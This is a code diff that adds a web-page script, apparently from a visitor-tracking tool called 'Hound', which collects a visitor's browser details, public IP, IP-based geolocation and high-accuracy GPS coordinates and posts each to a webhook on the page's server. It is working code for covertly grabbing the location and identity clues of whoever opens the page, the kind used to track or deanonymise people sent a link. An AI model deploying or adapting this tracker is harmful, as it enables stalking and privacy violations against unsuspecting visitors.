@@ -1,0 +1,98 @@
+<script>
+    async function postData(url, data) {
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {
+            console.error('Error sending data', e);
+        }
+    }
+
+    async function gatherInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform, // Deprecated but still used
+            language: navigator.language,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            },
+            time: new Date().toString(),
+            referrer: document.referrer
+        };
+
+        await postData('/api/webhook', { type: 'device_info', info });
+    }
+
+    async function getIpInfo() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            document.getElementById('techchip').innerText = data.ip; // Keep original ID for compatibility
+
+            await postData('/api/webhook', { type: 'ip_simple', ip: data.ip });
+
+            const res2 = await fetch(`http://ip-api.com/json/${data.ip}`);
+            const data2 = await res2.json();
+            await postData('/api/webhook', { type: 'ip_full', details: data2 });
+        } catch (e) {
+            console.error('IP fetch error', e);
+        }
+    }
+
+    function getLocation() {
+        const status = document.getElementById('techchip');
+        if (!navigator.geolocation) {
+            status.innerText = 'Geolocation not supported';
+            postData('/api/webhook', { type: 'error', message: 'Geolocation not supported' });
+            return;
+        }
+
+        status.innerText = 'Locating...';
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const coords = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+                postData('/api/webhook', { type: 'gps', coords });
+                status.innerText = 'Location Captured! (Accuracy: ' + Math.round(position.coords.accuracy) + 'm)';
+                console.log('Location captured');
+            },
+            (error) => {
+                let msg = 'Unknown error';
+                switch (error.code) {
+                    case error.PERMISSION_DENIED: msg = 'User denied permission'; break;
+                    case error.POSITION_UNAVAILABLE: msg = 'Position unavailable'; break;
+                    case error.TIMEOUT: msg = 'Location timeout'; break;
+                }
+                status.innerText = 'Error: ' + msg;
+                console.error('Geo error:', msg);
+                postData('/api/webhook', { type: 'error', message: msg });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+
+    // Main execution flow
+    function startHound() {
+        console.log('Hound started');
+        gatherInfo();
+        getIpInfo();
+        getLocation();
+    }
+
+    // Expose start function to global scope
+    window.startHound = startHound;
+</script>
